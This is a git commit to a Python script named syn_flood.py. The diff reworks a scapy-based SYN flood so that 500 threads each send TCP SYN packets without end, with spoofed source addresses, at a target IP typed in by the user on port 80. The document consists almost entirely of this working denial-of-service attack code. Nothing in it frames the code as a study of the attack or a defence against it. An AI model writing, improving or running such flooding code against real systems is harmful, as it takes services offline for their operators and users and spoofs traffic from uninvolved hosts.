75cb730a63cccd81037f2a6d69a8bb81f7183a4f
RobertJohnSoler <rsoler@hawk.iit.edu>
2024-12-26 23:36:45 -0600

    syn_flooding now using threads

--- syn_flood.py
+++ syn_flood.py
@@ -1,12 +1,18 @@
 from scapy.all import *
 from random import getrandbits
+import threading
 
 target_ip = input("Enter target IP: ")
 target_port = 80
 
-ip = IP(src=RandIP(f'{target_ip}/24'), dst = target_ip)
-tcp = TCP(sport=RandShort(), dport=target_port, flags="S", seq=100)
-raw = Raw(b'Random data')
-syn_pack = ip/tcp/raw
-while True:
-    send(syn_pack)
+def attack():
+    ip = IP(src=RandIP(f'{target_ip}/24'), dst = target_ip)
+    tcp = TCP(sport=RandShort(), dport=target_port, flags="S", seq=100)
+    raw = Raw(b'Random data')
+    syn_pack = ip/tcp/raw
+    while True:
+        send(syn_pack, verbose=0)
+
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
